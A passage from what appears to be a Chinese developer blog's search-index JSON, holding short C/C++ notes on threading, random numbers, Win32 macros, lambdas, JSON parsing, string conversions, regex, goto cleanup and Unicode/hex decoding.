sta1,sta2;&#125;;","tags":[{"name":"cpp","slug":"cpp","permalink":"http://example.com/tags/cpp/"},{"name":"队列","slug":"队列","permalink":"http://example.com/tags/%E9%98%9F%E5%88%97/"},{"name":"栈","slug":"栈","permalink":"http://example.com/tags/%E6%A0%88/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"http://example.com/categories/B-Code/CPP/"},{"name":"STL","slug":"B-Code/CPP/STL","permalink":"http://example.com/categories/B-Code/CPP/STL/"}]},{"title":"C++常用写法整理","date":"2023-10-27T01:24:02.102Z","path":"B_Code/CPP/STL/thread/【CPP】常用写法整理/","text":"[toc] 线程睡眠1234567头文件定义：#include &lt;thread&gt;std::this_thread::sleep_for(std::chrono::milliseconds(1000));//睡眠1000毫秒（1秒）等同：std::chrono::milliseconds dura(1000);std::this_thread::sleep_for(dura);","tags":[{"name":"stl","slug":"stl","permalink":"http://example.com/tags/stl/"},{"name":"thread","slug":"thread","permalink":"http://example.com/tags/thread/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"http://example.com/categories/B-Code/CPP/"},{"name":"STL","slug":"B-Code/CPP/STL","permalink":"http://example.com/categories/B-Code/CPP/STL/"},{"name":"thread","slug":"B-Code/CPP/STL/thread","permalink":"http://example.com/categories/B-Code/CPP/STL/thread/"}]},{"title":"【C++】常用编码及经验整理","date":"2023-10-27T01:24:02.101Z","path":"B_Code/CPP/CPP开发经验/","text":"概述：C++开发过程中遇到的常用代码段和经验整理 [toc] 睡眠123456头文件定义：#include &lt;thread&gt;std::this_thread::sleep_for(std::chrono::milliseconds(1000));//睡眠1000毫秒（1秒）等同：std::chrono::milliseconds dura(1000);std::this_thread::sleep_for(dura); 随机字符串12345678910111213141516171819202122std::string SPString::RandomString(int length)&#123; std::string chars&#123; &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot; &#125;; std::random_device rd; std::mt19937 generator(rd()); std::string output; output.reserve(length); int len_chars = chars.length(); while (length &gt; 0) &#123; auto randNumb = generator(); while (randNumb &gt; len_chars &amp;&amp; length--) &#123; output.push_back(chars[randNumb % len_chars]); randNumb /= len_chars; &#125; &#125; return output;&#125; 随机数12345// 生成随机数 std::random_device rd;std::mt19937 gen(rd());std::uniform_int_distribution&lt;&gt; dis(0, 999);int nId = dis(gen); 临时禁用编译告警1234#pragma warning(push)#pragma warning(disable:4305) pCandidate=(VOID PTR_T PTR_T)ModuleSectionInfo.pBase;#pragma warning(pop) C 开发宏整理文件读写标志123456789101112131415161718/* * NOTE: this is also used for opening text files. * WIN32 treats Control-Z as EOF in files opened in text mode. * Therefore, we open files in binary mode on Win32 so we can read * literal control-Z. The other affect is that we see CRLF, but * that is OK because we can already handle those cleanly. */#if defined(WIN32) || defined(__CYGWIN__)#define PG_BINARY O_BINARY#define PG_BINARY_A &quot;ab&quot;#define PG_BINARY_R &quot;rb&quot;#define PG_BINARY_W &quot;wb&quot;#else#define PG_BINARY 0#define PG_BINARY_A &quot;a&quot;#define PG_BINARY_R &quot;r&quot;#define PG_BINARY_W &quot;w&quot;#endif 申请释放内存1234567891011121314151617181920212223242526#ifdef _DEBUG // // DEBUG // #ifndef DBG_NEW #define DBG_NEW new ( _NORMAL_BLOCK , __FILE__ , __LINE__ ) #define new DBG_NEW #endif #define _CRTDBG_MAP_ALLOC #include &lt;stdlib.h&gt; #include &lt;crtdbg.h&gt; #define OS_FREE(pMem) free(pMem) #define OS_ALLOC(Size) calloc(Size,1); #define OS_DEBUG(...) _cprintf(__VA_ARGS__) #define DEBUG_BREAK() __debugbreak()#else // // RELEASE // #define OS_FREE(pMem) HeapFree(GetProcessHeap(), 0, pMem) #define OS_ALLOC(Size) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Size) #define OS_DEBUG(...) _cprintf(__VA_ARGS__) #define DEBUG_BREAK()#endif // _DEBUG 用于debug的宏需要自己实现 AutoDebugTrace 部分，也可直接替换 outputdebug 12#define DBUG_TRACE \\ const AutoDebugTrace _db_trace(DBUG_PRETTY_FUNCTION, __FILE__, __LINE__) windows获取nt导出函数的宏1234567891011121314151617181920212223242526272829303132333435#ifndef _MANAGED#if _MSC_VER &gt;= 1200#pragma warning(push)#pragma warning(disable:4255) // () treated as (void)#endif#ifndef _MAC#ifdef _WIN64typedef INT_PTR (FAR WINAPI *FARPROC)();typedef INT_PTR (NEAR WINAPI *NEARPROC)();typedef INT_PTR (WINAPI *PROC)();#elsetypedef int (FAR WINAPI *FARPROC)();typedef int (NEAR WINAPI *NEARPROC)();typedef int (WINAPI *PROC)();#endif // _WIN64#elsetypedef int (CALLBACK *FARPROC)();typedef int (CALLBACK *NEARPROC)();typedef int (CALLBACK *PROC)();#endif#if _MSC_VER &gt;= 1200#pragma warning(pop)#endif#elsetypedef INT_PTR (WINAPI *FARPROC)(void);typedef INT_PTR (WINAPI *NEARPROC)(void);typedef INT_PTR (WINAPI *PROC)(void);#endif#define DEFINE_NTDLL(x) _ ## x f ## x = (_ ## x)GetProcAddressNT(#x)FARPROC GetProcAddressNT(LPCSTR lpName)&#123; return GetProcAddress(GetModuleHandleW(L&quot;ntdll&quot;), lpName);&#125; C++17 [[fallthrough]] 用法，在 switch case中不中断继续执行。 1234567891011121314151617181920switch (DoTrace(cs)) &#123; case ENABLE_TRACE: cs-&gt;framep-&gt;level |= TRACE_ON; if (!TRACING) break; [[fallthrough]]; // 不跳出 switch，继续下一个case case DO_TRACE: if (TRACING) &#123; if (!cs-&gt;locked) native_mutex_lock(&amp;THR_LOCK_dbug); DoPrefix(cs, _line_); Indent(cs, cs-&gt;level); (void)fprintf(cs-&gt;stack-&gt;out_file, &quot;&gt;%.*s\\n&quot;, cs-&gt;func_len, cs-&gt;func); DbugFlush(cs); /* This does a unlock */ &#125; break; case DISABLE_TRACE: cs-&gt;framep-&gt;level &amp;= ~TRACE_ON; [[fallthrough]]; case DONT_TRACE: break;&#125; 修改 cout 文本颜色1234567891011121314151617181920212223242526272829303132333435363738394041424344//// main.cpp// ColoredHelloWorld//// Created by obaby on 14-2-27.// Copyright (c) 2014年 mars. All rights reserved.// #include &lt;iostream&gt; //the following are UBUNTU/LINUX ONLY terminal color codes.#define RESET &quot;\\033[0m&quot;#define BLACK &quot;\\033[30m&quot; /* Black */#define RED &quot;\\033[31m&quot; /* Red */#define GREEN &quot;\\033[32m&quot; /* Green */#define YELLOW &quot;\\033[33m&quot; /* Yellow */#define BLUE &quot;\\033[34m&quot; /* Blue */#define MAGENTA &quot;\\033[35m&quot; /* Magenta */#define CYAN &quot;\\033[36m&quot; /* Cyan */#define WHITE &quot;\\033[37m&quot; /* White */#define BOLDBLACK &quot;\\033[1m\\033[30m&quot; /* Bold Black */#define BOLDRED &quot;\\033[1m\\033[31m&quot; /* Bold Red */#define BOLDGREEN &quot;\\033[1m\\033[32m&quot; /* Bold Green */#define BOLDYELLOW &quot;\\033[1m\\033[33m&quot; /* Bold Yellow */#define BOLDBLUE &quot;\\033[1m\\033[34m&quot; /* Bold Blue */#define BOLDMAGENTA &quot;\\033[1m\\033[35m&quot; /* Bold Magenta */#define BOLDCYAN &quot;\\033[1m\\033[36m&quot; /* Bold Cyan */#define BOLDWHITE &quot;\\033[1m\\033[37m&quot; /* Bold White */ int main(int argc, const char * argv[])&#123; // insert code here... std::cout&lt; &lt;RED &lt;&lt;&quot;Hello, World! in RED\\n&quot;; std::cout&lt;&lt;GREEN &lt;&lt;&quot;Hello, World! in GREEN\\n&quot;; std::cout&lt;&lt;YELLOW &lt;&lt;&quot;Hello, World! in YELLOW\\n&quot;; std::cout&lt;&lt;BLUE &lt;&lt;&quot;Hello, World! in BLUE\\n&quot;; std::cout&lt;&lt;MAGENTA &lt;&lt;&quot;Hello, World! in MAGENTA\\n&quot;; std::cout&lt;&lt;CYAN &lt;&lt;&quot;Hello, World! in CYAN\\n&quot;; std::cout&lt;&lt;WHITE &lt;&lt;&quot;Hello, World! in WHITE\\n&quot;; std::cout&lt;&lt;BOLDRED &lt;&lt;&quot;Hello, World! in BOLDRED\\n&quot;; std::cout&lt;&lt;BOLDCYAN &lt;&lt;&quot;Hello, World! in BOLDCYAN\\n&quot;; return 0;&#125; 在 windows 中也可以使用SetConsoleTextAttribute 接口 1234567891011121314151617181920212223242526// ColordCout.cpp : Defines the entry point for the console application.// #include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;windows .h&gt; using namespace std; void SetColor(unsigned short forecolor =4 ,unsigned short backgroudcolor =0)&#123; HANDLE hCon =GetStdHandle(STD_OUTPUT_HANDLE); //获取缓冲区句柄 SetConsoleTextAttribute(hCon,forecolor|backgroudcolor); //设置文本及背景色&#125; int _tmain(int argc, _TCHAR* argv[])&#123; SetColor(40,30); std::cout &lt; &lt;&quot;Colored hello world for windows!\\n&quot;; SetColor(120,20); std::cout &lt;&lt;&quot;Colored hello world for windows!\\n&quot;; SetColor(10,50); std::cout &lt;&lt;&quot;Colored hello world for windows!\\n&quot;; return 0;&#125;","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"http://example.com/categories/B-Code/CPP/"}]},{"title":"Lambda表达式","date":"2023-10-27T01:24:02.099Z","path":"B_Code/CPP/Lambda表达式/","text":"概述：lambda表达式使用及说明 [toc] lambda表达式说明lambda表达式的结构如下所示： 1auto func = [capture] (params) opt -&gt; ret &#123; func_body; &#125;; 其中 func 是可以当作 lambda 表达式的名字，作为一个函数使用，capture 是捕获列表，params 是参数表，opt： 不需要可以省略。 （mutable: 可以修改按值传递进来的拷贝（注意是能修改拷贝，而不是值本身）exception: 指定函数抛出的异常，如抛出整数类型的异常，可以使用 throw ()）， ret 是返回值类型，func_body 是函数体。 12auto f = [](int a) -&gt; int &#123; return a + 1; &#125;;std::cout &lt;&lt; f(1) &lt;&lt; std::endl; // 输出: 2 使用 lambda 表达式捕获列表lambda 表达式还可以通过捕获列表捕获一定范围内的变量： [] 不捕获任何变量。 [&amp;] 捕获外部作用域中所有变量，并作为引用在函数体中使用（按引用捕获）。 [&#x3D;] 捕获外部作用域中所有变量，并作为副本在函数体中使用（按值捕获）。 [&#x3D;，&amp;foo] 按值捕获外部作用域中所有变量，并按引用捕获 foo 变量。 [bar] 按值捕获 bar 变量，同时不捕获其他变量。 [this] 捕获当前类中的 this 指针，让 lambda 表达式拥有和当前类成员函数同样的访问权限。如果已经使用了 &amp; 或者 &#x3D;，就默认添加此选项。捕获 this 的目的是可以在 lamda 中使用当前类的成员函数和成员变量。 捕获列表使用实例12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;functional&gt;using namespace std;class lambdaTest&#123;public: void output(int x, int y) &#123; //auto x1 = [] &#123;return m_number; &#125;; // error auto x2 = [=] &#123;return m_number + x + y; &#125;; // ok // auto x3 = [=] &#123; x = 2; return m_number + x + y; &#125;; // error auto x4 = [&amp;] &#123;return m_number + x + y; &#125;; // ok auto x5 = [this] &#123;return m_number; &#125;; // ok //auto x6 = [this] &#123;return m_number + x + y; &#125;; // error auto x7 = [this, x, y] &#123;return m_number + x + y; &#125;; // ok &#125; int m_number = 100;&#125;;int main()&#123; lambdaTest test; test.output(1,2);&#125; 函数 是否可读 是否可修改 说明 x1 :x: :x: 错误，没有捕获外部变量，不能使用任何外部变量 x2 :heavy_check_mark: :x: 正确，值传递，可以访问所有外部变量 x3 :heavy_check_mark: :x: 错误，值传递，右值可读不可修改 x4 :heavy_check_mark: :heavy_check_mark: 正确，引用传递，可读可修改 x5 :heavy_check_mark: this指针的成员变量可读:x: 其他变量不可读 :heavy_check_mark: this指针的成员可写:x: 其他变量不可写 正确，捕获this指针，可访问this指针的成员 x6 同 x5 同 x5 错误，捕获 this 指针，x 和 y 不是其成员变量，不可访问 x7 :heavy_check_mark: 值传递三个变量，均可读 :heavy_check_mark: this指针成员可修改 :x: x 和 y 不可修改 正确，捕获 this 指针，x,y 返回值lambda表达式的返回值通过 ‘-&gt;’ 传递，如下所示： 123auto add = [](int x, int y) -&gt; int &#123; return x + y;&#125;； 如上所示的返回类型还可以使用 decltype 推导返回类型： decltype 是一个 C++ 关键字，它用于在编译时推断表达式的类型。这在编写通用代码时非常有用，特别是在使用 C++11 引入的 auto 关键字和范围 for 循环时。 123auto add = [](int x, int y) -&gt; decltype(x+y) &#123; return x + y;&#125;； 说明：decltype(a + b) 推导了 a + b 的结果类型，并将该类型作为 lambda 函数的返回类型。 甚至，从 C++14 开始，还可以使用更简洁的方式来推导 lambda 函数的返回类型，即使用 auto 关键字。例如： 1auto myLambda = [](int a, int b) -&gt; auto &#123; return a + b; &#125;; 需要注意的是，使用 auto 推导返回类型的 lambda 函数在某些情况下可能会引发歧义。例如，如果你在 lambda 表达式中返回一个嵌套类型（如 std::pair），auto 可能会被推导为 std::pair，而不是你期望的嵌套类型的具体类型。在这种情况下，使用 decltype 可以更明确地指定返回类型。 其他关键字使用 lambda 表达式捕获列表捕获外部变量，如果希望去修改按值捕获的外部变量，那么应该如何处理呢？这就需要使用 mutable 选项，被mutable修改是lambda表达式就算没有参数也要写明参数列表，并且可以去掉按值捕获的外部变量的只读（const）属性。 mutable123int a = 0;auto f1 = [=] &#123;return a++; &#125;; // error, 按值捕获外部变量, a是只读的auto f2 = [=]()mutable &#123;return a++; &#125;; // ok :tipping_hand_man: 注意：mutable 只是允许在函数内部修改值而已，作用域仅限于 lambda 函数内部，参考以下代码及输出： 12345678910111213141516171819202122232425262728void lambdaFunc()&#123; auto add1 = [](int x, int y) -&gt; int &#123; return x + y; &#125;; auto add2 = [](int x, int y) -&gt; decltype(x + y) &#123; return x + y; &#125;; auto add3 = [](int a, int b) -&gt; auto &#123; return a + b; &#125;; auto modify_add = [](int a, int b) mutable -&gt; auto &#123; a = 3; return a + b; &#125;; auto value_modify_add = [=](int a, int b) mutable -&gt; auto &#123; a = 4; return a + b; &#125;; auto refrence_modify_add = [&amp;](int a, int b) mutable -&gt; auto &#123; a = 5; return a + b; &#125;; auto refrence_modify_add_byRef = [&amp;](int&amp; a, int b) mutable -&gt; auto &#123; a = 6; return a + b; &#125;; int x = 2, y = 2; cout &lt;&lt; &quot;add1:&quot; &lt;&lt; add1(x, y) &lt;&lt; endl; // add1:4 cout &lt;&lt; &quot;add2:&quot; &lt;&lt; add2(x, y) &lt;&lt; endl; // add2:4 cout &lt;&lt; &quot;add3:&quot; &lt;&lt; add3(x, y) &lt;&lt; endl; // add3:4 cout &lt;&lt; &quot;modify_add:&quot; &lt;&lt; value_modify_add(x, y) &lt;&lt; endl; // modify_add:5 cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; endl; // x=2 cout &lt;&lt; &quot;value_modify_add:&quot; &lt;&lt; value_modify_add(x, y) &lt;&lt; endl; // value_modify_add:6 cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; endl; // x=2 cout &lt;&lt; &quot;value_modify_add:&quot; &lt;&lt; refrence_modify_add(x, y) &lt;&lt; endl; // value_modify_add:7 cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; endl; // x=2 cout &lt;&lt; &quot;refrence_modify_add_byRef:&quot; &lt;&lt; refrence_modify_add_byRef(x, y) &lt;&lt; endl; // refrence_modify_add_byRef:8 cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; endl; // x=6&#125; 关于为什么通过值拷贝的方式捕获的外部变量是只读的:lambda表达式的类型在C++11中会被看做是一个带 operator() 的类，即仿函数。按照C++标准，lambda表达式的 operator() 默认是 const 的，一个 const 成员函数是无法修改成员变量值的。mutable 选项的作用就在于取消 operator () 的 const 属性。 因为 lambda 表达式在 C++ 中会被看做是一个仿函数，因此可以使用std::function和std::bind来存储和操作lambda表达式： 1234567891011121314151617181920212223void testLambdawithfunction()&#123; // 包装可调用函数 std::function&lt;int(int)&gt; f1 = [](int a) &#123;return a; &#125;; // 绑定可调用函数 std::function&lt;int(int)&gt; f2 = bind([](int a) &#123;return a; &#125;, placeholders::_1); // 绑定可修改的函数 std::function&lt;int(int&amp;, int)&gt; f3 = [](int&amp; a, int b) &#123; a = 3; return a + b; &#125;; // 绑定可修改的函数 std::function&lt;int(int&amp;, int)&gt; f4 = bind([](int&amp; a, int b) &#123; a = 4; return a + b; &#125;, std::placeholders::_1, std::placeholders::_2); int x = 2, y = 2; // 函数调用 cout &lt;&lt; &quot;f1(100)&quot; &lt;&lt; f1(100) &lt;&lt; endl; // f1(100)100 cout &lt;&lt; &quot;f2(200)&quot; &lt;&lt; f2(200) &lt;&lt; endl; // f2(200)200 cout &lt;&lt; &quot;f3(x, y)&quot; &lt;&lt; f3(x, y) &lt;&lt; endl; // f3(x, y)5 cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; endl; // x=3 cout &lt;&lt; &quot;f3(x, y)&quot; &lt;&lt; f4(x, y) &lt;&lt; endl; // f3(x, y)6 cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; endl; // x=4&#125; 对于没有捕获任何变量的 lambda 表达式，还可以转换成一个普通的函数指针： 123456789using func_ptr = int(*)(int);// 没有捕获任何外部变量的匿名函数func_ptr f = [](int a)&#123; return a; &#125;;// 函数调用f(1314); 参考文章 C++——Lambda函数_c++ lambda函数_勿在浮沙築高臺的博客-CSDN博客","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"http://example.com/categories/B-Code/CPP/"}]},{"title":"Json11 C++ 用法总结","date":"2023-10-27T01:24:02.099Z","path":"B_Code/CPP/Json11/","text":"[toc] 1234567891011121314151617181920212223242526std::string strMsg = R&quot;(&#123; &quot;user&quot; :&quot;test&quot;, &quot;status&quot;:&quot;login&quot;, //登录状态：login、logout &quot;result&quot;:&quot;1&quot;, //登录和登出结果，1表示成功，0表示失败 &quot;reason&quot;:&quot;&quot;, //原因，比如超时退出，准入策略限制导致登录失败等 &quot;token&quot;:&quot;xxx&quot; //token内容 &#125;)&quot;; std::string strMsg_empty = &quot;&quot;; Json::object jstest = Json::object&#123;&#125;; string err; const auto json = Json::parse(strMsg_empty, err, JsonParse::COMMENTS); jstest[&quot;msgtype&quot;] = &quot;test&quot;; jstest[&quot;data&quot;] = (json); Json json1 = Json(jstest); std::cout &lt;&lt; json1.dump(); const Json obj = Json::object(&#123; &#123; &quot;msgtype&quot;, &quot;TEST&quot; &#125;, &#123; &quot;data&quot;, json &#125;, &#125;); std::cout &lt;&lt; obj.dump() &lt;&lt; std::endl;","tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"Json","slug":"Json","permalink":"http://example.com/tags/Json/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"http://example.com/categories/B-Code/CPP/"}]},{"title":"字符串类型转换整理(char、TCHAR、string、wstring、CString、WCHAR)","date":"2023-10-27T01:24:02.099Z","path":"B_Code/CPP/【CPP】字符串类型相互转换/","text":"[TOC] string &lt;–&gt; CStringstring -&gt; CString12345std::string str = &quot;string&quot;;CString csRet;// csRet.Format(&quot;%s&quot;, str.c_str());// 如果上句报错就使用csRet.Format(_T(&quot;%s&quot;), str.c_str()); CString -&gt; string123CString cstr(&quot;string&quot;);string string &lt; – &gt; wstringstring -&gt; wstringsolution 1： 12345678910#include &lt;string&gt;#include &lt;locale&gt;#include &lt;codecvt&gt; //convert string to wstringinline std::wstring to_wide_string(const std::string&amp; input)&#123; std::wstring_convert&lt;std::codecvt_utf8&lt;wchar_t&gt;&gt; converter; return converter.from_bytes(input);&#125; solution 2: 1234567891011121314151617wstring stringToWstring(std::string str)&#123; wstring result = L&quot;&quot;; int nLen = MultiByteToWideChar(CP_ACP, 0, str.c_str(), str.size(), NULL, 0); if (nLen == 0) return result; TCHAR* buffer = new TCHAR[nLen + 1]; MultiByteToWideChar(CP_ACP, 0, str.c_str(), str.size(), buffer, nLen); buffer[nLen] = &#x27;\\0&#x27;; result.append(buffer); delete[] buffer; return result;&#125; wstring -&gt; string123456//convert wstring to string inline std::string to_byte_string(const std::wstring&amp; input)&#123; std::wstring_convert&lt;std::codecvt_utf8&lt;wchar_t&gt;&gt; converter; return converter.to_bytes(input);&#125; DWORD &lt;—&gt; string12345string DwordToString(DWORD val)&#123; string cur_str = to_string(long long (val)); return cur_str;&#125; 123456DWORD StringToDword(string val)&#123; DWORD cur_dword; sscanf(val.c_str(),&quot;%ul&quot;,&amp;cur_dword); return cur_dword;&#125; 更多查看已实现的编码转换文件： win_str_utils win_str_utils.md","tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"String","slug":"String","permalink":"http://example.com/tags/String/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"http://example.com/categories/B-Code/CPP/"}]},{"title":"C++内存分配","date":"2023-10-27T01:24:02.097Z","path":"B_Code/CPP/【CPP】内存分配/","text":"C++ 程序运行期间内存分配整理 [toc] new 内存分配在C++中，使用new关键字分配的内存是在虚拟内存中。虚拟内存是一种抽象概念，它允许程序以连续且固定大小的内存地址空间运行，而不管物理内存的实际配置如何。 当你使用new在C++中创建一个对象或数组时，内存管理器会在堆内存中分配一块空间，并返回指向这块空间的指针。即使这块空间超出了程序当前的实际物理内存，操作系统也会通过页面调度和内存映射机制来确保程序的正确运行。 因此，使用new分配的内存是在虚拟内存中，但操作系统会根据物理内存的实际配置进行管理。","tags":[{"name":"CPP","slug":"CPP","permalink":"http://example.com/tags/CPP/"},{"name":"内存分配","slug":"内存分配","permalink":"http://example.com/tags/%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"http://example.com/categories/B-Code/CPP/"}]},{"title":"【regex】正则表达式反向引用","date":"2023-10-27T01:24:02.096Z","path":"B_Code/C/正则表达式/匹配不等于/","text":"[^a]* 表示匹配除了a以外的所有字符[^abc]* 表示匹配除了a、b、c以外的所有字符，注意这里不是abc字符串，而是a、b、c任何一个字符都不匹配 当我们要不匹配某个字符串或者中文词组的时候，可以这样用((?!天空).)* 这个表示匹配出’天空’之外的所有字符 regex(?![0-9]+) 匹配不是regex，但后面不是数字","tags":[{"name":"regex","slug":"regex","permalink":"http://example.com/tags/regex/"},{"name":"正则表达式","slug":"正则表达式","permalink":"http://example.com/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"C","slug":"B-Code/C","permalink":"http://example.com/categories/B-Code/C/"},{"name":"正则表达式","slug":"B-Code/C/正则表达式","permalink":"http://example.com/categories/B-Code/C/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"【C/C++】Goto用法整理","date":"2023-10-27T01:24:02.095Z","path":"B_Code/C/goto妙用/","text":"当一个条件不满足，函数要退出时，已经申请的内存没有释放，但是又需要return的情况下，可以使用goto 以下边的函数为例，在判断if(pRet[i] == NULL)时，如果为空时，如果直接return的话，那么已经申请内存的pRet则成了流浪儿，未能完全释放。在这种情况下就可以使用return语句直接调到程序的末尾去执行释放的操作。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879 /* * @fn Merge * @brief 根据输入的int变量求其对应的hash值 * @param[in] intervals: 需要合并的数组 intervalsSize: 需要合并的数组的大小 intervalsColSize: 需要合并的数组的数量 * @param[out] returnSize: 合并区间后数组的大小 returncolumnSizes: 合并区间后数组的数量 * @return int: 根据哈希生成的key值 * * @detail * @date 2021-7-20 */int** Merge(_In_ int** intervals, _In_ int intervalsSize, _In_ int* intervalsColSize, _Out_ int* returnSize, _Out_ int** returnColumnSizes)&#123; // 如果只有一个区间，直接返回 TODO:有必要的情况下-》申请内存 if(intervalsSize == 1) &#123; return intervals; &#125; int nItem = 0; // 第一个元素从小到大排序；如果第一个元素相等，则根据第二个元素从小到大排序 qsort(intervals, intervalsSize, sizeof(int *), Compare); int **pRet = (int**)malloc(sizeof(int*)*ARRSIZE_MAX_N); if(pRet == NULL) &#123; return NULL; &#125; // 定义返回指针 for(int i=0; i&lt;intervalsSize; i++) &#123; pRet[i] = (int*)malloc(sizeof(int)*intervalsColSize[0]); if(pRet[i] == NULL) &#123;- return NULL;+ goto END; &#125; memset(pRet[i],0,sizeof(int)*intervalsColSize[0]); &#125; // 先将第一个区间存入 pRet[nItem][0] = intervals[0][0]; pRet[nItem][1] = intervals[0][1]; //遍历合并到pRet for(int i=0; i &lt; intervalsSize; i++) &#123; // 当前区间起点小于合并区间终点-》覆盖 if(intervals[i][0] &lt;= pRet[nItem][1] &amp;&amp; intervals[i][1] &gt;= pRet[nItem][1]) &#123; pRet[nItem][1] = intervals[i][1]; &#125; // 当前区间的起点大于合并区间的终点-》下一节点 else if(intervals[i][0] &gt; pRet[nItem][1]) &#123; (nItem)++; pRet[nItem][0] = intervals[i][0]; pRet[nItem][1] = intervals[i][1]; &#125; &#125; // 返回结果 *returnSize = nItem + 1; *returnColumnSizes = intervalsColSize; return pRet;// Issue+END:+ free(pRet);+ return NULL;&#125;","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"C","slug":"B-Code/C","permalink":"http://example.com/categories/B-Code/C/"}]},{"title":"【编解码】Unicode解码","date":"2023-10-27T01:24:02.094Z","path":"B_Code/C/Unicode解码/","text":"概述：Unicode解码 参考文章： windows下C++实现Unicode和Utf8编码的互转_c++ unicode转utf-8-CSDN博客 C &#x2F; C++ 处理转义 \\uxxxx 字符-CSDN博客 前言由于前后端交互中编码的问题，出现了这样的一串字符： 1&#123;&quot;share_names&quot;:[&quot;\\u4e2d\\u6587\\u8def\\u5f84&quot;]&#125; 出现了unicode编码作为字符串内容的情况，直接用json解析的话会报错，所以在json解析前需要先进行转码，两种方案 所有的 ASCII 编码转为 UNICODE 所有 UNICODE 转为 ASCII 常规思维就是 UNICODE 转为 ASCII。 思路UNICODE 编码占用了两个字节，所以在处理时需要使用宽字符，也就是 wchar_t 或者 wstring。 特征：UNICODE 的编码格式固定：\\udddd 的形式。 步骤说明： 遍历整个字符串 发现 \\\\u 则读取对应的 dddd 保存 dddd 到宽字符串中。需要按照 16 进制读取。 代码C++版本12345678910111213141516string Unescape(const string&amp; input) &#123; wstring wresult; for (size_t i = 0; i &lt; input.length(); ) &#123; if (input[i] == &#x27;\\\\&#x27; &amp;&amp; input[i + 1] == &#x27;u&#x27;) &#123; string code = input.substr(i + 2, 4); wchar_t unicode = stoi(code, nullptr, 16); wresult += unicode; i += 6; &#125; else &#123; wresult += input[i++]; &#125; &#125; wstring_convert&lt;codecvt_utf8&lt;wchar_t&gt;&gt; conv; string result = conv.to_bytes(wresult); return result;&#125; ATL版本123456789101112131415161718CString Unescape(const CString&amp; csInput) &#123; string input = CW2A(csInput); wstring wresult; for (size_t i = 0; i &lt; input.length(); ) &#123; if (input[i] == &#x27;\\\\&#x27; &amp;&amp; input[i + 1] == &#x27;u&#x27;) &#123; string code = input.substr(i + 2, 4); wchar_t unicode = stoi(code, nullptr, 16); wresult += unicode; i += 6; &#125; else &#123; wresult += input[i++]; &#125; &#125; CString csResult; csResult.Format(L&quot;%s&quot;, wresult); return csResult;&#125; 补充如果直接使用 C++ string 构造的话，就能正确识别十六进制中文字符 123456789101112#include &lt;iostream&gt;using namespace std;int main() &#123; string jsonStr = &quot;&#123;\\&quot;share_names\\&quot;:[\\&quot;\\u4e2d\\u6587\\u8def\\u5f84\\&quot;]&#125;&quot;; cout &lt;&lt; jsonStr &lt;&lt; endl; cout &lt;&lt; &quot;≡ is the same as \\u2261&quot; &lt;&lt; endl; string s(&quot;≡ is the same as \\u2261&quot;); cout &lt;&lt; s &lt;&lt; endl;&#125;","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"C","slug":"B-Code/C","permalink":"http://example.com/categories/B-Code/C/"}]},{"title":"【编解码】Hex与Byte相互转化","date":"2023-10-27T01:24:02.093Z","path":"B_Code/C/HexToByte/","text":"概述：本文主要记录实现 16进制与字符串互相转换的逻辑与实现 参考博客：C语言快速互转HEX（16进制）和原始字符串&#x2F;数组 – 晨旭的博客~ 说明16进制格式为 0x00、0x01……这样的形式 十进制格式为 0、1、2…… 这样的形式 主要参考 ASCII码一览表，ASCII码对照表，实现的内容就是 十进制到十六进制 的互相转换 实现HexToByte123456789101112131415161718192021222324#include &lt;stdio.h&gt;void from_hex(char *s, int l, char *d)&#123; while(l--) &#123; char* p = s+l; char* p2 = p-1; *(d+l/2) = ( (*p&gt;&#x27;9&#x27;? *p+9 : *p) &amp; 0x0f ) | ( (*p2&gt;&#x27;9&#x27;? *p2+9 : *p2) &lt;&lt; 4 ); l--; &#125;&#125;int main () &#123; char s[]= &quot;6F6B6f6b&quot;; char d[5]; d[4] = &#x27;\\0&#x27;; from_hex(s,8,d); printf(&quot;%s&quot;,d); return 0;&#125; ByteToHex123456789101112131415161718192021222324252627282930313233343536#include &lt;stdio.h&gt;const char hex_table[] = 